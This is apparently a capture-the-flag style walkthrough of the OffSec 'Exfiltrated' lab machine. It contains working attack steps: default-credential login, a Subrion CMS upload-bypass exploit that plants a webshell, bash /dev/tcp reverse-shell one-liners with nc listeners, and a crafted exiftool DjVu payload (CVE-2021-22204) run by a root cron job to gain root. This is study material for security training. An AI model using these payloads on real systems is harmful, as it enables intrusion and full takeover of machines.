# Export
```bash
export IP="192.168.122.163"
export URL="http://192.168.122.163:80/FUZZ"
```

<hr>

# Credentials
+ Web Subrion: `admin:admin`
+ MYSQL: `subrionuser:target100`

<hr>

# RCE
```bash
searchsploit Subrion 4.2.1
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Subrion CMS 4.2.1 - File Upload Bypass to RCE (Authenticated)                                                                                               | php/webapps/49876.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

```bash
$ searchsploit -x php/webapps/49876.py
$ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: HDUgrsxjx6on2NWuf6kfmKLDxgcfXy7QIDVebkAo
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: tqrdcqpnkrgchnr

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/tqrdcqpnkrgchnr.phar 

$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.122%2F80+0%3E%261%22
```

+ URL revshell decode
```bash
$ bash -c "bash -i >& /dev/tcp/192.168.49.122/80 0>&1"
```

+ Reverse shell

```bash
$ nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.49.122] from (UNKNOWN) [192.168.122.163] 57592
bash: cannot set terminal process group (973): Inappropriate ioctl for device
bash: no job control in this shell
www-data@exfiltrated:/var/www/html/subrion/uploads$
```

<hr>

# Privilege Escalation
#### Crontab

```bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /etc/crontab
...
* *     * * *   root    bash /opt/image-exif.sh
```

+ Read `/opt/image-exif.sh` file.

```bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

####  `exiftool` → RCE
+ PoC: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce

+ On local terminal, execute:

```bash
$ sudo apt-get update && sudo apt-get install -y djvulibre-bin
$ cat payload
(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.49.63/80 0>&1\"')};")
$ bzz payload payload.bzz
$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
$ cat configfile                             
%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
1; #end%
$ exiftool -config configfile  '-HasselbladExif<=exploit.djvu' sample.jpg
$ python3 -m http.server 80
```

+ On the target shell, execute:
```bash
$ www-data@exfiltrated:/var/www/html/subrion/uploads$ wget 192.168.49.63/sample.jpg
Connecting to 192.168.49.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4405 (4.3K) [image/jpeg]
Saving to: ‘sample.jpg’

sample.jpg                                         100%[=====================================================================================================================>]   4.30K  --.-KB/s    in 0.03s 
```

+ Wait for a few seconds
```bash
$ nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.49.63] from (UNKNOWN) [192.168.63.163] 50058
bash: cannot set terminal process group (37008): Inappropriate ioctl for device
bash: no job control in this shell
root@exfiltrated:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

<hr>

# Nmap
```bash
$ sudo nmap --open -sV -A -p- -vv -n -Pn $IP -oN nmap/services.txt
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; 
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
```

<hr>

# Web Application
+ `/robots.txt`

```bash
$ curl -s $URL/robots.txt
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

+ `/panel/` → reveals **Subrion 4.2.1 CMS** 

```bash
$ curl -s $URL/panel/                      
<!DOCTYPE html>                                                                                
<html lang="en" dir="ltr">                                                                                                                                                                    
    <head>                                                                                     
        <meta charset="utf-8"> 
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">                                                                                                                                 
        <title>Login :: Powered by Subrion 4.2</title>                                         
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="generator" content="Subrion CMS - Open Source Content Management System"> 
...
```
